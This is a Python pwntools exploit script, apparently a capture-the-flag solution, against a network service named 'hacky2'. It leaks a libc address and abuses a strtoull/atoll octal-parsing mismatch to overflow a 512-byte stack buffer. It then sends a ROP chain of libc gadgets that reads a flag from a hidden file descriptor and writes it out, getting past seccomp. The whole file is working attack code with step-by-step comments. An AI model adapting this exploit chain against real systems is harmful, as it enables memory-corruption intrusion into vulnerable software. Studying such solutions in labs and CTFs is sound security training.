#!/usr/bin/python3

#import libraries
import sys
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky2"
port = 13716
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


fallback_timeout = 3


#This is where the exploit lives.
def exploit():
    proc = remote(host, port, fam="ipv4")

    proc.readuntil(b"stderr = ")
    stderrleak = proc.readuntil(b".\x1b[0m\n")[:-6].decode()

    addr_libc_stderr = int(stderrleak, 16)
    print(f"(-) stderr@libc has been leaked and extracted: {addr_libc_stderr:#0x}")

    addr_libc_base = addr_libc_stderr - 0x1cf5c0
    print(f"(-) calculated libc base address: {addr_libc_base:#0x}")

    #We abuse the fact, that strtoull() interprets a number with a leading 0 as base 8, whereas 
    #  atoll() interprets it as base 10.
    #Hence 0777 will be converted to the decimal number 511 for the comparison with BUFSZ, but 
    #  will be passed as the decimal number 777 to fun().
    #Thus a buffer of size 512 will be allocated on the stack, but up to 777 byte will be read by 
    #  read(), triggering a buffer overflow on the stack of up to 266 byte.
    #Note that this makes triggering a ROP chain trivial, since no Stack Canary is present.
    buffer_overflow_trigger_str = b"0777\n"
    print(f"(-) Triggering buffer overflow vulnerability using input {buffer_overflow_trigger_str}")
    proc.write(buffer_overflow_trigger_str);

    #Now that we have our buffer overflow, the actual challenge lies in reading and writing the 
    #  flag to stdout.
    #Although we can trigger pretty long, arbitrary ROP-Chains now, seccomp prevents us from 
    #  opening new files and both the original filedescriptors to retrieve our flag as well as 
    #  that of stdout have been closed. Fortunately both have also been copied to a different, 
    #  randomized filedescriptor stored in global varibles (.bss section) before closing.
    #Since PIE is disabled both of those variables have fixed addresses that can be retrieved 
    #  from the binary and hardcoded here.
    addr_vuln_outfd = 0x40404c
    addr_vuln_flagfd = 0x404050

    #Now that we've found our filedescriptors we also need a memory known memory location to 
    #  store our flag at. Since ASLR is enabled we opted to use the .data section for this 
    #  purpose, overriding __data_start (8 bytes), __dso_handle (8 bytes), __TMC_END__ (16 bytes), 
    #  the now closed filedescriptor stdout (8 bytes).
    addr_vuln_data = 0x404000

    #To read from flagfd and write to outfd we will use read() and write() from libc.
    addr_libc_read = addr_libc_base + 0xeb3c0
    addr_libc_write = addr_libc_base + 0xeb460

    #These are the addresses some basic pop-ret ROP-Gadgets we will use in our ROP-Chain.
    pop_rdi_ret                       = addr_libc_base + 0x023796
    pop_rsi_ret                       = addr_libc_base + 0x02590f
    pop_rdx_ret                       = addr_libc_base + 0xc770d
    pop_rax_ret                       = addr_libc_base + 0x3be88

    #Additionally we need a gadget to read a value from memory, to get the two filedescriptors 
    #  flagfd and outfd.
    mov_edi_memat_rdiPLUS0xe0_jmp_rax = addr_libc_base + 0x708ea

    #This is the number of bytes we will read/write to communicate our flag of format
    #  b'flag_01234567890abcdef01234567890abcdef\n'
    len_flag = 38

    #This is the constant from vuln.c that specifies the size of the buffer
    buf_size = 512
    #This is the number of bytes between the buffer and the return address
    restofstack_to_retaddr = 3*8
    #This is the total number of bytes we need to write to the buffer to reach the return address
    offset_buf_retaddr = buf_size + restofstack_to_retaddr

    #Now let's construct our ROP-Chain
    ropchain  = b""
    print("(-) Constructing ROP-Chain.")

    #read flag to data section
    #  ARG 3: count
    ropchain += p64(pop_rdx_ret)
    ropchain += p64(len_flag)
    #  ARG 2: buf
    ropchain += p64(pop_rsi_ret)
    ropchain += p64(addr_vuln_data)
    #  ARG 1 [preparation]: (&fd) - 0xe0
    ropchain += p64(pop_rdi_ret)
    ropchain += p64(addr_vuln_flagfd - 0xe0)
    #  ADDR of read@glibc
    ropchain += p64(pop_rax_ret)
    ropchain += p64(addr_libc_read)
    #  ARG 1: *((&fd) - 0xe0 + 0xe0) == fd
    ropchain += p64(mov_edi_memat_rdiPLUS0xe0_jmp_rax)

    #write flag from data section to stdout
    #  ARG 3: count
    ropchain += p64(pop_rdx_ret)
    ropchain += p64(len_flag)
    #  ARG 2: buf
    ropchain += p64(pop_rsi_ret)
    ropchain += p64(addr_vuln_data)
    #  ARG 1 [preparation]: (&fd) - 0xe0
    ropchain += p64(pop_rdi_ret)
    ropchain += p64(addr_vuln_outfd - 0xe0)
    #  ADDR of write@glibc
    ropchain += p64(pop_rax_ret)
    ropchain += p64(addr_libc_write)
    #  ARG 1: *((&fd) - 0xe0 + 0xe0) == fd
    ropchain += p64(mov_edi_memat_rdiPLUS0xe0_jmp_rax)

    #That's all. Simply trigger the ROP-Chain and read the flag. :)
    print("(-) Sending ROP-Chain.")
    proc.write(offset_buf_retaddr * b"A" + ropchain + b"\n")
    print("(-) Retrieving flag.")
    try:
        proc.readuntil(b"\x1b[36mEnter length: \x1b[33m")
        flag = proc.readline(timeout=fallback_timeout)
        if b'flag' in flag:
            print("(-) Obtained flag: " + flag.decode())
        else:
            print("(-) Looks like something went wrong obtaining the flag.\n")
    except EOFError:
        print("(-) Looks like something went wrong obtaining the flag.\n")

    proc.close()
    return

#Invoke the exploit when the script is executed.
exploit()


